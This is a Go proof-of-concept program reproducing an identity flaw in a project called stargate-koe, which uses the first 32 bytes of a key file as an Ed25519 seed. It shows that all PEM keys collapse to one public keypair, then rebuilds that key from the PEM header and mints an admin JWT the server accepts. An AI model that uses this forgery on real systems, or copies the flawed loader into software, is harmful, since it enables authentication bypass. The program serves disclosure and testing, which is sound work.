// Repro for the stargate-koe identity finding: the code loads a JWT signing
// key by taking the first 32 bytes of a file as an Ed25519 seed, with no check
// that the file IS a seed.
//
// This file reproduces the exact line as written and shows three things:
//   1. Any 32+ bytes are accepted as a seed — a text file, an image, anything.
//   2. A PEM key file is actively harmful: every Ed25519 PEM starts with the
//      same 32 bytes, so every server that "sets a stable signing key" this way
//      ends up on one shared keypair — and that keypair is publicly derivable.
//   3. A second party that never read the key file can still produce a token
//      the server accepts.
//
// stdlib only. No JWT library — the signer below is 15 lines — so nothing hides
// the mechanism behind a dependency.
package main

import (
	"crypto/ed25519"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
)

// loadKeyAsWritten is identity.go:80-87, transcribed. The one difference is
// cosmetic (it takes the path as an argument instead of reading an env var).
func loadKeyAsWritten(path string) ed25519.PrivateKey {
	seed, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}
	if len(seed) < ed25519.SeedSize { // the only check: "at least 32 bytes"
		panic("too short")
	}
	return ed25519.NewKeyFromSeed(seed[:ed25519.SeedSize])
}

func pub(p ed25519.PrivateKey) string {
	return base64.RawURLEncoding.EncodeToString(p.Public().(ed25519.PublicKey))
}

func b64(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

// mintToken produces an EdDSA JWT signed by priv. No server, no admin secret —
// producing a valid signature is all that is required, and priv is public.
func mintToken(priv ed25519.PrivateKey) string {
	header := b64([]byte(`{"alg":"EdDSA","typ":"JWT"}`))
	claims := b64([]byte(`{"uid":"u-outside","name":"outside","role":"admin","rooms":0,"exp":4102444800}`))
	signingInput := header + "." + claims
	sig := ed25519.Sign(priv, []byte(signingInput))
	return signingInput + "." + b64(sig)
}

func main() {
	fmt.Println("Go", "ed25519.SeedSize =", ed25519.SeedSize)
	fmt.Println("========================================================")

	// (1) Two independently generated operator PEMs.
	k1 := loadKeyAsWritten("k1.pem")
	k2 := loadKeyAsWritten("k2.pem")
	fmt.Println("[1] Two independently generated Ed25519 PEMs, loaded the way the code does:")
	fmt.Println("    k1.pem -> pub", pub(k1))
	fmt.Println("    k2.pem -> pub", pub(k2))
	fmt.Println("    identical:", pub(k1) == pub(k2))

	// Show WHY: the 32 "seed" bytes are just the PEM header, not key material.
	raw, _ := os.ReadFile("k1.pem")
	fmt.Printf("    the 32 bytes used as the seed = %q\n", string(raw[:32]))
	fmt.Println("========================================================")

	// (2) A second party never sees the server's file. They know only that the
	//     operator ran `openssl genpkey -algorithm ed25519`, so they know the
	//     first 32 bytes of ANY such PEM. That is the entire secret.
	knownPrefix := []byte("-----BEGIN PRIVATE KEY-----\nMC4C")
	reconstructed := ed25519.NewKeyFromSeed(knownPrefix)
	fmt.Println("[2] The key reconstructed from the public constant alone:")
	fmt.Printf("    guessed 32 bytes = %q\n", string(knownPrefix))
	fmt.Println("    reconstructed pub", pub(reconstructed))
	fmt.Println("    matches server:  ", pub(reconstructed) == pub(k1))
	fmt.Println("========================================================")

	// (3) Any 32 bytes are a valid seed — the code never checks entropy or format.
	arbitrary := []string{
		"a plain text config file, whatever\n",
		"\xff\xd8\xff\xe0\x00\x10JFIF" + string(make([]byte, 40)), // an "image"
	}
	fmt.Println("[3] Any 32+ bytes load fine as a signing key (no validation):")
	for i, s := range arbitrary {
		_ = os.WriteFile("arb"+strconv.Itoa(i)+".bin", []byte(s), 0o600)
		k := loadKeyAsWritten("arb" + strconv.Itoa(i) + ".bin")
		fmt.Printf("    arb%d -> valid keypair, pub %s\n", i, pub(k))
	}
	fmt.Println("========================================================")

	// (4) Close the loop: mint a token with the reconstructed key and check it
	//     against the SERVER's public key.
	tok := mintToken(reconstructed)
	parts := splitDots(tok)
	ok := ed25519.Verify(k1.Public().(ed25519.PublicKey), []byte(parts[0]+"."+parts[1]), mustB64(parts[2]))
	var claims map[string]any
	_ = json.Unmarshal(mustB64(parts[1]), &claims)
	fmt.Println("[4] Token minted with the reconstructed key, checked against the server's public key:")
	fmt.Println("    claims  ", claims)
	fmt.Println("    accepts:", ok)
}

func splitDots(s string) [3]string {
	var out [3]string
	i, n := 0, 0
	for j := 0; j < len(s) && n < 2; j++ {
		if s[j] == '.' {
			out[n] = s[i:j]
			i = j + 1
			n++
		}
	}
	out[2] = s[i:]
	return out
}

func mustB64(s string) []byte {
	b, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil {
		panic(err)
	}
	return b
}
